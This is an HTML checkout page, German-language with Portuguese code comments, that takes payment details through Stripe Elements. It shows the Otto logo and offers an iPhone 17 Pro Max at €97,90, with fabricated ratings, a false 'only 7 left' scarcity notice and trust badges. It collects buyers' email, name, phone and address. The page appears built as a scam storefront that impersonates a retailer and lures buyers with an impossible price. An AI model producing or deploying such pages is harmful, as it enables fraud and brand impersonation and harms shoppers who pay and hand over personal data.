<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Checkout Seguro</title>

<script src="https://cdn.tailwindcss.com"></script>
<script src="https://js.stripe.com/v3/"></script>

<style>
  body { background:#f7f7f7 }
</style>
</head>

<body class="flex justify-center p-4">

<div class="w-full max-w-md">

  <!-- LOGO -->
  <div class="flex justify-center mb-4">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Otto_logo.svg" class="h-10">
  </div>

  <!-- PRODUTO -->
  <div class="bg-white rounded-2xl p-4 shadow mb-4">
    <img src="https://images.unsplash.com/photo-1695048133142-1a20484d2569" class="rounded-xl mb-3">
    
    <h2 class="font-bold text-lg">iPhone 17 Pro Max 512GB</h2>
    
    <p class="text-green-600 font-bold text-xl mt-1">€97,90</p>

    <div class="text-sm text-gray-500 mt-2">
      ⭐⭐⭐⭐⭐ 4.8/5 • 5.214 Kunden
    </div>

    <div class="text-red-500 text-sm mt-1">
      🔥 Nur noch 7 Stück verfügbar
    </div>
  </div>

  <!-- CONFIANÇA -->
  <div class="flex justify-between text-xs text-gray-600 mb-4">
    <span>🔒 Sicher</span>
    <span>🚚 Lieferung DE</span>
    <span>💳 Geschützt</span>
  </div>

  <!-- FORM -->
  <div class="bg-white p-4 rounded-2xl shadow">

    <input id="email" placeholder="E-Mail" class="w-full mb-2 p-3 border rounded-xl"/>
    <input id="name" placeholder="Name" class="w-full mb-2 p-3 border rounded-xl"/>
    <input id="phone" placeholder="Telefon" class="w-full mb-2 p-3 border rounded-xl"/>
    <input id="line1" placeholder="Adresse" class="w-full mb-2 p-3 border rounded-xl"/>
    <input id="postal" placeholder="PLZ" class="w-full mb-2 p-3 border rounded-xl"/>
    <input id="city" placeholder="Stadt" class="w-full mb-3 p-3 border rounded-xl"/>

    <div id="payment-element" class="mb-4"></div>

    <button id="payBtn"
      class="w-full bg-green-600 text-white p-4 rounded-xl font-bold text-lg">
      Sicher bezahlen 🔒
    </button>

    <p id="msg" class="text-red-500 text-sm mt-2"></p>
  </div>

</div>

<script>
const stripe = Stripe("pk_test_51TBgoGEW8oxEd9zwTAYExiMbsojNAhPFukQqgePMWLNCjiwCKx6ykphs9617ZR9JkMjqf0mf2zrq3pUc9xt2WLtn00gCMYs146")

let elements

async function init() {
  const res = await fetch('/create-payment-intent', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({})
  })

  const data = await res.json()

  elements = stripe.elements({ clientSecret:data.clientSecret })

  const payment = elements.create('payment')
  payment.mount('#payment-element')
}

init()

document.getElementById('payBtn').onclick = async () => {

  const email = document.getElementById('email').value
  const name = document.getElementById('name').value
  const phone = document.getElementById('phone').value
  const line1 = document.getElementById('line1').value
  const postal = document.getElementById('postal').value
  const city = document.getElementById('city').value

  const { error } = await stripe.confirmPayment({
    elements,
    confirmParams:{
      receipt_email: email,
      shipping:{
        name,
        phone,
        address:{
          line1,
          postal_code: postal,
          city,
          country:'DE'
        }
      },
      return_url: window.location.origin + "/sucesso.html"
    }
  })

  if(error){
    document.getElementById('msg').textContent = error.message
  }
}
</script>

</body>
</html>
